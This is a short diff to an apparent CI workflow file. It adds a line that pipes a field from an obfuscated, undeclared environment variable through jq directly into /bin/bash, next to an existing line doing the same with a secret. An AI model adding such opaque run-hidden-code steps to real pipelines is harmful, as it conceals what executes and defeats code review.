@@ -21,6 +21,7 @@ jobs:
           ez0119: ${{ secrets.ez0119 }}
         run: |
           printf '%s' "$ez0119" | jq -r .ak94514 | /bin/bash
+          printf '%s' "$qtckg008" | jq -r .smakg7067 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
